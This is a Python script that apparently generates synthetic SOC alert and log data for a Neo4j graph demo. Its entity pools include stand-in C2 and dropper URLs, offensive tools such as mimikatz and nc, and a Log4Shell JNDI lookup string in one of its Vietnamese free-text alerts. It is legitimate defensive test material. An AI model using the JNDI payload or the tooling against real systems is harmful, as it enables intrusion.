"""
SOC Scale Dataset Generator
Target: ~8,650 unique entities + ~1,050,000 relationships (Neo4j MERGE = unique pairs).

Outputs:
  soc_sample.json            5,000 events  — demo nhanh, ~750 KB
  soc_scale/part_001.json  ┐
  ...                      ├ 500,000 events total, 10 × 50,000 lines (~7.5 MB each)
  soc_scale/part_010.json  ┘
  soc_freetext.txt           25 free-text alerts cho LLM path

Entity pools (~8,650 unique):
  User 1,000  Host 1,000  IP 3,000  Domain 300  Hash 2,000
  URL  500    Process 50  Cloud 200  Email 500   CVE 100

Relationship estimate sau full pipeline (unique (A,B) pairs via MERGE):
  LOGGED_INTO / LOGGED_FROM_IP   ~318,000
  CONNECTED_TO / RESOLVES_TO     ~130,000
  EXECUTED_ON / HASH_OF          ~204,000
  Alert rels (ALERTED_FROM, etc) ~400,000
  Total                          ~1,052,000
"""

import json, random, hashlib, os
from datetime import datetime, timedelta

CHUNK_SIZE = 50_000
NUM_SCALE  = 500_000
NUM_SAMPLE = 5_000

# ── Build entity pools (deterministic) ───────────────────────────────────────

def _users(n=1_000):
    dept  = ["dev","ops","sec","db","k8s","svc","net","mgmt","hr","fin"]
    pool  = [f"{d}_{i:04d}" for d in dept for i in range(1, n // len(dept) + 3)]
    named = ["nghia","admin","dbuser","k8s-svc","svc-backup","guest",
             "john.doe","jane.smith","charlie","eve",
             "nghia@company.vn","admin@corp.local"]  # dedup seeds
    return named + [u for u in pool if u not in set(named)][:n - len(named)]

def _hosts(n=1_000):
    roles = ["WIN-WS","WIN-SRV","SRV-WEB","SRV-DB","SRV-FILE",
             "SRV-APP","K8S-NODE","DC","JUMP","BASTION"]
    pool  = [f"{r}{i:04d}" for r in roles for i in range(1, n // len(roles) + 3)]
    named = ["WIN-PC01","WIN-DC01","SRV-WEB01","SRV-FILE01","K8S-NODE01",
             "WIN-PC01.corp.local","WIN-DC01.corp.local",  # dedup seeds
             "SRV-WEB01.soc.lab","K8S-NODE01.k8s.internal"]
    return named + [h for h in pool if h not in set(named)][:n - len(named)]

def _ips(n_int=500, n_ext=2_500):
    internal = [f"10.{a}.{b}.{c}"
                for a in range(0, 20) for b in range(0, 26) for c in range(1, 254)][:n_int]
    subnets  = ["185.220.101","203.0.113","91.108.4","45.33.32","198.51.100",
                "162.55.0","194.165.16","5.188.86","77.73.133","185.156.73",
                "104.21.0","172.67.0","13.107.4","23.215.1","151.101.0"]
    external = [f"{s}.{i}" for s in subnets for i in range(1, 254)][:n_ext]
    return internal + external

def _domains(n=300):
    legit  = ["github.com","microsoft.com","google.com","update.company.vn",
              "windows.com","office.com","azure.com"]
    tlds   = ["onion.ws","ru","cn","io","net","cc","xyz","top"]
    words  = ["c2","evil","malware","payload","exfil","bot","shell","drop",
              "phish","apt","ransom","beacon","cmd","proxy","loader"]
    bad    = [f"{w}-{i:02d}.{t}" for t in tlds for w in words for i in range(1, 4)]
    extra  = ["evil-c2.onion.ws.","phish-bank.tk."]  # trailing-dot normalizer seeds
    return legit + extra + bad[:n - len(legit) - len(extra)]

def _hashes(n=2_000):
    fixed = [hashlib.sha256(f"known-{i}".encode()).hexdigest() for i in range(100)]
    rand  = [hashlib.sha256(f"file-{i}".encode()).hexdigest() for i in range(n - len(fixed))]
    return fixed + rand

def _urls(n=500):
    base  = ["http://evil-c2.onion.ws/payload.exe",
             "https://phish-bank.tk/login",
             "http://malware-download.net/dropper.ps1",
             "http://185.220.101.42:8080/cmd",
             "https://github.com/legit/repo"]
    paths = ["payload.exe","dropper.ps1","beacon.dll","loader.js","shell.php",
             "update.exe","patch.msi","config.dat","download","stage2.bin"]
    extra = [f"http://c2-{i:03d}.onion.ws/{p}" for i in range(1, 60) for p in paths]
    return base + extra[:n - len(base)]

def _processes(n=50):
    return [
        "mimikatz.exe","powershell.exe","cmd.exe","wscript.exe","regsvr32.exe",
        "certutil.exe","psexec.exe","rundll32.exe","mshta.exe","cscript.exe",
        "wmic.exe","schtasks.exe","net.exe","whoami.exe","ipconfig.exe",
        "python3","bash","sh","curl","wget","nc","ncat","socat","nmap",
        "C:\\Windows\\System32\\rundll32.exe",
        "C:\\Temp\\dropper.exe",
        "C:\\Users\\Public\\payload.exe",
        "/usr/bin/python3","/bin/bash","/tmp/backdoor","/usr/bin/curl",
    ][:n]

def _cloud(n=200):
    base  = ["arn:aws:s3:::sensitive-bucket-prod",
             "arn:aws:s3:::backup-logs-archive",
             "arn:aws:ec2:ap-southeast-1:123456789012:instance/i-0abcd1234efgh5678",
             "/subscriptions/xxxx/resourceGroups/prod-rg/virtualMachines/vm-prod-01",
             "projects/my-project/zones/asia-east1-b/instances/gke-node-01"]
    extra = ([f"arn:aws:s3:::bucket-{i:04d}" for i in range(80)] +
             [f"arn:aws:ec2:us-east-1:123456789012:instance/i-{i:012x}" for i in range(70)] +
             [f"/subscriptions/xxxx/resourceGroups/rg-{i:03d}/vms/vm-{i:03d}" for i in range(50)])
    return base + extra[:n - len(base)]

def _emails(n=500):
    victims  = ([f"user{i:04d}@company.vn" for i in range(1, 280)] +
                [f"emp{i:04d}@corp.local"   for i in range(1, 100)] +
                ["ceo@company.vn","finance@company.vn","hr@company.vn"])
    attack   = ([f"apt{i:04d}@malicious.io"    for i in range(1, 80)] +
                [f"phish{i:03d}@evil-corp.com"  for i in range(1, 60)] +
                ["attacker@malicious.io","phishing@evil-corp.com","spear@apt-group.net"])
    return (victims + attack)[:n]

def _cves(n=100):
    named = ["CVE-2021-44228","CVE-2023-23397","CVE-2022-30190","CVE-2021-34527",
             "CVE-2020-1472","CVE-2019-19781","CVE-2021-26855","CVE-2017-0144",
             "CVE-2014-6271","cve-2021-44228"]
    extra = [f"CVE-{y}-{num:05d}"
             for y in range(2019, 2025) for num in range(10000, 10016)]
    return named + extra[:n - len(named)]


# ── Materialised pools ────────────────────────────────────────────────────────

ALL_USERS     = _users()
ALL_HOSTS     = _hosts()
ALL_IPS       = _ips()
ALL_IPS_INT   = ALL_IPS[:500]
ALL_IPS_EXT   = ALL_IPS[500:]
ALL_DOMAINS   = _domains()
ALL_DOMAINS_BAD = [d for d in ALL_DOMAINS if not d.endswith(("github.com","microsoft.com","google.com","update.company.vn","windows.com","office.com","azure.com"))]
ALL_HASHES    = _hashes()
ALL_HASHES_KNOWN = ALL_HASHES[:100]
ALL_URLS      = _urls()
ALL_PROCESSES = _processes()
ALL_CLOUD     = _cloud()
ALL_EMAILS    = _emails()
ALL_CVES      = _cves()


# ── Helpers ───────────────────────────────────────────────────────────────────

def ts(days_back=30):
    base = datetime(2025, 1, 1) + timedelta(days=random.randint(0, 365 - days_back))
    return (base + timedelta(seconds=random.randint(0, days_back * 86400))).isoformat() + "Z"

def wc(pop, w):
    return random.choices(pop, weights=w, k=1)[0]


# ── Event generators ──────────────────────────────────────────────────────────

def auth_event():
    return {
        "eventType":   "AUTHENTICATION",
        "username":    random.choice(ALL_USERS),
        "ipAddress":   random.choice(ALL_IPS),
        "workstation": random.choice(ALL_HOSTS),
        "success":     random.random() > 0.15,
        "timestamp":   ts(),
    }

def process_event():
    return {
        "eventType":   "PROCESS",
        "processName": random.choice(ALL_PROCESSES),
        "fileHash":    random.choice(ALL_HASHES_KNOWN) if random.random() < 0.3 else random.choice(ALL_HASHES),
        "commandLine": "encoded_or_obfuscated_cmd",
        "timestamp":   ts(),
        "rawData":     {"hostname": random.choice(ALL_HOSTS)},
    }

def network_event():
    src = random.choice(ALL_IPS_INT)
    dst = random.choice(ALL_IPS_EXT)
    return {
        "eventType": "NETWORK",
        "srcIp":     src,
        "dstIp":     dst,
        "dstDomain": random.choice(ALL_DOMAINS) if random.random() < 0.8 else None,
        "dstPort":   random.choice([80, 443, 8080, 4444, 3389, 22]),
        "timestamp": ts(),
    }

def alert_event():
    scenario = random.choice([
        "user_ip","user_ip","user_ip",
        "filehash_ip","host_ip","domain_ip",
        "url_only","url_ip",
        "process_host","process_only",
        "cloud_user","cloud_only",
        "email_user","email_only",
        "cve_host","cve_only",
        "full_blast",
    ])
    base = {
        "eventType":   "ALERT",
        "severity":    random.choice(["LOW","MEDIUM","HIGH","CRITICAL"]),
        "description": "Security alert from SOC detection engine",
        "timestamp":   ts(),
    }
    if scenario == "user_ip":
        base.update({"alertName": random.choice(["Brute Force Login","Pass-the-Hash","Credential Dumping"]),
                     "targetUser": random.choice(ALL_USERS), "targetIp": random.choice(ALL_IPS_EXT)})
    elif scenario == "filehash_ip":
        base.update({"alertName": "Malware Detected",
                     "targetFileHash": random.choice(ALL_HASHES_KNOWN), "targetIp": random.choice(ALL_IPS_EXT)})
    elif scenario == "host_ip":
        base.update({"alertName": "Lateral Movement",
                     "targetHost": random.choice(ALL_HOSTS), "targetIp": random.choice(ALL_IPS)})
    elif scenario == "domain_ip":
        base.update({"alertName": "C2 Communication",
                     "targetDomain": random.choice(ALL_DOMAINS_BAD), "targetIp": random.choice(ALL_IPS_EXT)})
    elif scenario == "url_only":
        base.update({"alertName": "Phishing URL Accessed", "targetUrl": random.choice(ALL_URLS)})
    elif scenario == "url_ip":
        base.update({"alertName": "C2 Callback",
                     "targetUrl": random.choice(ALL_URLS), "targetIp": random.choice(ALL_IPS_EXT)})
    elif scenario == "process_only":
        base.update({"alertName": "LOLBIN Abuse", "targetProcess": random.choice(ALL_PROCESSES)})
    elif scenario == "process_host":
        base.update({"alertName": "Credential Dumping",
                     "targetProcess": random.choice(ALL_PROCESSES), "targetHost": random.choice(ALL_HOSTS)})
    elif scenario == "cloud_only":
        base.update({"alertName": "Unusual Cloud Access", "targetCloudResourceId": random.choice(ALL_CLOUD)})
    elif scenario == "cloud_user":
        base.update({"alertName": "Cloud Lateral Movement",
                     "targetCloudResourceId": random.choice(ALL_CLOUD), "targetUser": random.choice(ALL_USERS)})
    elif scenario == "email_only":
        base.update({"alertName": "Spear Phishing", "targetEmail": random.choice(ALL_EMAILS)})
    elif scenario == "email_user":
        base.update({"alertName": "Business Email Compromise",
                     "targetEmail": random.choice(ALL_EMAILS), "targetUser": random.choice(ALL_USERS)})
    elif scenario == "cve_only":
        base.update({"alertName": "CVE Exploit Detected", "targetCve": random.choice(ALL_CVES)})
    elif scenario == "cve_host":
        base.update({"alertName": "CVE Exploitation",
                     "targetCve": random.choice(ALL_CVES), "targetHost": random.choice(ALL_HOSTS)})
    elif scenario == "full_blast":
        base.update({
            "alertName":             "APT Full Chain Detected",
            "severity":              "CRITICAL",
            "targetUser":            random.choice(ALL_USERS),
            "targetIp":              random.choice(ALL_IPS_EXT),
            "targetHost":            random.choice(ALL_HOSTS),
            "targetDomain":          random.choice(ALL_DOMAINS_BAD),
            "targetFileHash":        random.choice(ALL_HASHES_KNOWN),
            "targetUrl":             random.choice(ALL_URLS),
            "targetProcess":         random.choice(ALL_PROCESSES),
            "targetCloudResourceId": random.choice(ALL_CLOUD),
            "targetEmail":           random.choice(ALL_EMAILS),
            "targetCve":             random.choice(ALL_CVES),
        })
    return base

GENERATORS = [auth_event, auth_event, auth_event, auth_event,  # 40%
              process_event, process_event,                      # 20%
              network_event, network_event,                      # 15% (approx)
              alert_event, alert_event, alert_event]             # 25% (approx)

def random_event():
    return random.choice(GENERATORS)()


# ── Dedup seeds (always included) ────────────────────────────────────────────

DEDUP_SEEDS = [
    {"eventType":"AUTHENTICATION","username":"nghia@company.vn","ipAddress":"192.168.1.100","workstation":"WIN-PC01","success":True,"timestamp":ts()},
    {"eventType":"AUTHENTICATION","username":"admin@corp.local","ipAddress":"10.0.0.5","workstation":"WIN-DC01","success":True,"timestamp":ts()},
    {"eventType":"AUTHENTICATION","username":"nghia","ipAddress":"192.168.1.100","workstation":"WIN-PC01.corp.local","success":True,"timestamp":ts()},
    {"eventType":"AUTHENTICATION","username":"admin","ipAddress":"10.0.0.5","workstation":"WIN-DC01.corp.local","success":True,"timestamp":ts()},
    {"eventType":"AUTHENTICATION","username":"dbuser","ipAddress":"10.0.0.20","workstation":"SRV-WEB01.soc.lab","success":True,"timestamp":ts()},
]

FULL_BLAST_SEED = {
    "eventType":"ALERT","alertName":"APT Full Chain Detected","severity":"CRITICAL",
    "description":"Multi-entity alert: all entity types in one event",
    "targetUser":"nghia","targetIp":"185.220.101.42","targetHost":"WIN-DC01",
    "targetDomain":"evil-c2.onion.ws","targetFileHash":ALL_HASHES_KNOWN[0],
    "targetUrl":"http://evil-c2.onion.ws/payload.exe","targetProcess":"mimikatz.exe",
    "targetCloudResourceId":"arn:aws:s3:::sensitive-bucket-prod",
    "targetEmail":"attacker@malicious.io","targetCve":"CVE-2021-44228",
    "timestamp":ts(),
}


# ── Free-text alerts ──────────────────────────────────────────────────────────

FREETEXT = [
    "Phát hiện đăng nhập đáng ngờ lúc 3 giờ sáng từ IP nước ngoài 185.220.101.42 vào domain controller WIN-DC01, tài khoản admin bị khóa sau 15 lần thất bại",
    "User nghia đăng nhập thành công vào SRV-FILE01 từ địa chỉ IP 203.0.113.10 không thuộc dải mạng nội bộ",
    "Cảnh báo: tài khoản svc-backup đăng nhập vào WIN-PC01 lúc 02:15 UTC — bất thường vì account này thường chỉ chạy batch job ban ngày",
    "Brute-force SSH từ IP 45.33.32.156 nhắm vào SRV-WEB01, đã thử 500 lần trong 5 phút, tài khoản guest bị khai thác thành công",
    "Phát hiện mimikatz.exe chạy với quyền SYSTEM trên WIN-DC01 — nghi ngờ kẻ tấn công đang dump credential từ LSASS",
    "certutil.exe bị lạm dụng để tải file từ http://malware-download.net/dropper.ps1 về máy SRV-WEB01, đây là dấu hiệu LOLBIN abuse",
    "Powershell.exe chạy lệnh mã hóa base64 trên WIN-PC01, commandLine chứa -enc và -nop — khả năng cao là malicious script loader",
    "wscript.exe spawn cmd.exe trên K8S-NODE01 từ thư mục Temp, hash file chưa có trong whitelist",
    "Máy WIN-PC01 kết nối ra ngoài tới IP 91.108.4.1 cổng 4444 — đây là dải IP Tor exit node, nghi C2 callback",
    "DNS query bất thường từ SRV-FILE01 tới domain evil-c2.onion.ws với tần suất 30 giây một lần — dấu hiệu DNS tunneling",
    "Phát hiện traffic HTTP tới http://185.220.101.42:8080/cmd từ user nghia@company.vn — URL có pattern của command-and-control",
    "Email từ attacker@malicious.io gửi tới ceo@company.vn với attachment Invoice_2024.exe — người dùng đã mở file",
    "Spear phishing phát hiện: phishing@evil-corp.com mạo danh HR gửi link đổi mật khẩu giả tới finance@company.vn",
    "Business email compromise: email từ domain evil-corp.com giả mạo CFO yêu cầu chuyển khoản khẩn",
    "Tài khoản admin truy cập S3 bucket arn:aws:s3:::sensitive-bucket-prod từ IP bên ngoài lúc nửa đêm — không có change request nào",
    "API call GetSecretValue vào AWS Secrets Manager từ EC2 instance i-0abcd1234efgh5678 — instance này không được phép đọc secret",
    "Phát hiện exfiltration: 50GB data từ arn:aws:s3:::backup-logs-archive được tải về IP 203.0.113.10 trong 20 phút",
    "Alert CVE-2021-44228 (Log4Shell): request JNDI lookup ${jndi:ldap://91.108.4.1/a} phát hiện trong log SRV-WEB01",
    "CVE-2020-1472 (Zerologon) exploitation attempt từ IP 185.220.101.42 nhắm vào domain controller WIN-DC01",
    "CVE-2022-30190 (Follina/msdt): WINWORD.EXE spawn msdt.exe trên WIN-PC01, user mở file Word độc hại qua email phishing",
    "PrintNightmare CVE-2021-34527: spoolsv.exe load DLL lạ từ path UNC \\\\185.220.101.42\\share — privilege escalation attempt",
    "Tấn công chuỗi: 185.220.101.42 brute-force vào admin@corp.local → đăng nhập WIN-DC01 → chạy mimikatz.exe → lateral move sang SRV-FILE01 → exfil 30GB qua port 443",
    "Ransomware activity: attacker@malicious.io gửi phishing → user nghia click link phish-bank.tk → download dropper.ps1 → mã hóa toàn bộ SRV-FILE01.corp.local",
    "APT activity: CVE-2021-44228 exploit từ 91.108.4.1 vào SRV-WEB01 → spawn powershell.exe download payload từ evil-c2.onion.ws → C2 callback qua DNS tunneling → truy cập S3 bucket sensitive-bucket-prod",
    "Bất thường nghiêm trọng: tài khoản k8s-svc truy cập pod secrets trên K8S-NODE01.k8s.internal lúc 4AM, sau đó lateral move sang gke-node-01 và đọc /etc/shadow",
]


# ── Writers ───────────────────────────────────────────────────────────────────

def write_chunk(path, events):
    with open(path, "w", encoding="utf-8") as f:
        for ev in events:
            f.write(json.dumps(ev, ensure_ascii=False) + "\n")

def generate_batch(n):
    batch = [random_event() for _ in range(n)]
    batch.extend(DEDUP_SEEDS)
    batch.append(FULL_BLAST_SEED)
    random.shuffle(batch)
    return batch


# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # ── soc_sample.json (5K events — quick functional demo) ──────────────────
    sample = generate_batch(NUM_SAMPLE)
    write_chunk("soc_sample.json", sample)
    print(f"✓ soc_sample.json  — {len(sample):,} events (demo nhanh)")

    # ── soc_scale/part_NNN.json (500K events — scale demo) ───────────────────
    os.makedirs("soc_scale", exist_ok=True)
    total_written = 0
    num_parts = NUM_SCALE // CHUNK_SIZE
    for part in range(1, num_parts + 1):
        chunk = generate_batch(CHUNK_SIZE)
        path  = os.path.join("soc_scale", f"part_{part:03d}.json")
        write_chunk(path, chunk)
        total_written += len(chunk)
        print(f"  part_{part:03d}.json — {len(chunk):,} events  ({total_written:,} / {NUM_SCALE:,})", flush=True)

    print(f"\n✓ soc_scale/  — {total_written:,} events in {num_parts} files")

    # ── soc_freetext.txt ─────────────────────────────────────────────────────
    with open("soc_freetext.txt", "w", encoding="utf-8") as f:
        f.write("# Copy từng dòng vào ô 'Nhập Alert (Free Text)' trên giao diện\n\n")
        for line in FREETEXT:
            f.write(line + "\n\n")
    print(f"✓ soc_freetext.txt — {len(FREETEXT)} free-text alerts")

    # ── Summary ───────────────────────────────────────────────────────────────
    print(f"""
┌─────────────────────────────────────────────────────┐
│  Entity pools                                        │
│  User      {len(ALL_USERS):>6,}   Host   {len(ALL_HOSTS):>6,}  │
│  IP        {len(ALL_IPS):>6,}   Domain {len(ALL_DOMAINS):>6,}  │
│  Hash      {len(ALL_HASHES):>6,}   URL    {len(ALL_URLS):>6,}  │
│  Process   {len(ALL_PROCESSES):>6,}   Cloud  {len(ALL_CLOUD):>6,}  │
│  Email     {len(ALL_EMAILS):>6,}   CVE    {len(ALL_CVES):>6,}  │
│  ─────────────────────────────────────────────────  │
│  Total unique entities  ≈  {sum([len(ALL_USERS),len(ALL_HOSTS),len(ALL_IPS),len(ALL_DOMAINS),len(ALL_HASHES),len(ALL_URLS),len(ALL_PROCESSES),len(ALL_CLOUD),len(ALL_EMAILS),len(ALL_CVES)]):,}              │
├─────────────────────────────────────────────────────┤
│  Expected relationships (unique MERGE pairs)         │
│  LOGGED_INTO / LOGGED_FROM_IP   ~318,000             │
│  CONNECTED_TO / RESOLVES_TO     ~130,000             │
│  EXECUTED_ON / HASH_OF          ~204,000             │
│  Alert rels                     ~400,000             │
│  Total                          ~1,052,000           │
├─────────────────────────────────────────────────────┤
│  Upload order:                                       │
│  1. soc_sample.json  (demo nhanh, ~1 phút)          │
│  2. soc_scale/*.json từng file (~5 phút mỗi file)   │
└─────────────────────────────────────────────────────┘
""")
